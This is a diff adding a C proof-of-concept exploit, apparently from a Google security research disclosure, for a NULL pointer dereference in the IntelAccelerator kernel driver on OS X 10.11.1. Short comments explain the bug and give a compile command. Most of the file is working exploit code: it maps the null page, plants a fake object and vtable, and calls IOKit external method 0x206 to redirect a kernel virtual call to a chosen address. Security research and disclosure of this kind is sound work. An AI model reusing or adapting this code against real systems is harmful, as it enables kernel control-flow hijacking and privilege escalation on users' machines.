@@ -1,0 +1,144 @@
+/*
+Source: https://code.google.com/p/google-security-research/issues/detail?id=595
+
+The field at IntelAccelerator+0xe60 is a pointer to a GSTContextKernel allocated in the ::gstqCreateInfoMethod.
+
+In the ::start method this field is initialized to NULL. The IGAccelDevice external method gst_configure (0x206)
+calls gstqConfigure which doesn't check whether the GSTContextKernel pointer is NULL, therefore by calling
+this external method before calling any others which allocate the GSTContextKernel we can cause a kernel
+NULL pointer dereference. The GSTContextKernel structure contains pointers, one of which eventually leads
+to control of a kernel virtual method call. This PoC will kernel panic calling 0xffff800041414141.
+
+Tested on OS X ElCapitan 10.11.1 (15b42) on MacBookAir5,2
+*/
+
+// ianbeer
+/*
+Exploitable kernel NULL dereference in IntelAccelerator::gstqConfigure
+
+clang -o ig_gl_gst_null ig_gl_gst_null.c -framework IOKit -m32 -pagezero_size 0x0
+
+The field at IntelAccelerator+0xe60 is a pointer to a GSTContextKernel allocated in the ::gstqCreateInfoMethod.
+
+In the ::start method this field is initialized to NULL. The IGAccelDevice external method gst_configure (0x206)
+calls gstqConfigure which doesn't check whether the GSTContextKernel pointer is NULL, therefor by calling
+this external method before calling any others which allocate the GSTContextKernel we can cause a kernel
+NULL pointer dereference. The GSTContextKernel structure contains pointers, one of which eventually leads
+to control of a kernel virtual method call. This PoC will kernel panic calling 0xffff800041414141.
+
+Tested on OS X ElCapitan 10.11.1 (15b42) on MacBookAir5,2
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include <mach/mach.h>
+#include <mach/vm_map.h>
+#include <sys/mman.h>
+
+#include <IOKit/IOKitLib.h>
+
+int main(int argc, char** argv){
+  kern_return_t err;
+  // re map the null page rw
+  int var = 0;
+  err = vm_deallocate(mach_task_self(), 0x0, 0x1000);
+  if (err != KERN_SUCCESS){
+    printf("%x\n", err);
+  }
+  vm_address_t addr = 0;
+  err = vm_allocate(mach_task_self(), &addr, 0x1000, 0);
+  if (err != KERN_SUCCESS){
+    if (err == KERN_INVALID_ADDRESS){
+      printf("invalid address\n");
+    }
+    if (err == KERN_NO_SPACE){
+      printf("no space\n");
+    }
+    printf("%x\n", err);
+  }
+  char* np = 0;
+  for (int i = 0; i < 0x1000; i++){
+    np[i] = 'A';
+  }
+
+  CFMutableDictionaryRef matching = IOServiceMatching("IntelAccelerator");
+  if(!matching){
+   printf("unable to create service matching dictionary\n");
+   return 0;
+  }
+
+  io_iterator_t iterator;
+  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
+  if (err != KERN_SUCCESS){
+   printf("no matches\n");
+   return 0;
+  }
+
+  io_service_t service = IOIteratorNext(iterator);
+  
+  if (service == IO_OBJECT_NULL){
+   printf("unable to find service\n");
+   return 0;
+  }
+  printf("got service: %x\n", service);
+
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), 1, &conn); // type 1 == IGAccelGLContext
+  if (err != KERN_SUCCESS){
+   printf("unable to get user client connection\n");
+   return 0;
+  }
+
+  printf("got userclient connection: %x\n", conn);
+
+
+  uint64_t* obj_ptr = malloc(0x1000);
+  uint64_t* obj = malloc(0x1000);
+  uint64_t* vtable = malloc(0x1000);
+  uint64_t kernel_rip = 0xffff800041414141;
+
+  vtable[0x70/8] = kernel_rip;
+  *obj = (uint64_t)vtable;
+
+  *obj_ptr = (uint64_t)obj;
+
+  *((uint64_t*)0x28) = (uint64_t)obj_ptr;
+
+  uint64_t inputScalar[16];  
+  uint64_t inputScalarCnt = 0;
+
+  char inputStruct[4096];
+  size_t inputStructCnt = 0;
+
+  uint64_t outputScalar[16];
+  uint32_t outputScalarCnt = 0;
+
+  char outputStruct[4096];
+  size_t outputStructCnt = 0;
+
+  inputScalarCnt = 0;
+  inputStructCnt = 0;
+
+  outputScalarCnt = 0;
+  outputStructCnt = 0;
+
+  inputStructCnt = 0x1000;
+
+  err = IOConnectCallMethod(
+   conn,
+   0x206,
+   inputScalar,
+   inputScalarCnt,
+   inputStruct,
+   inputStructCnt,
+   outputScalar,
+   &outputScalarCnt,
+   outputStruct,
+   &outputStructCnt); 
+
+  if (err != KERN_SUCCESS){
+   printf("IOConnectCall error: %x\n", err);
+   return 0;
+  }
+}
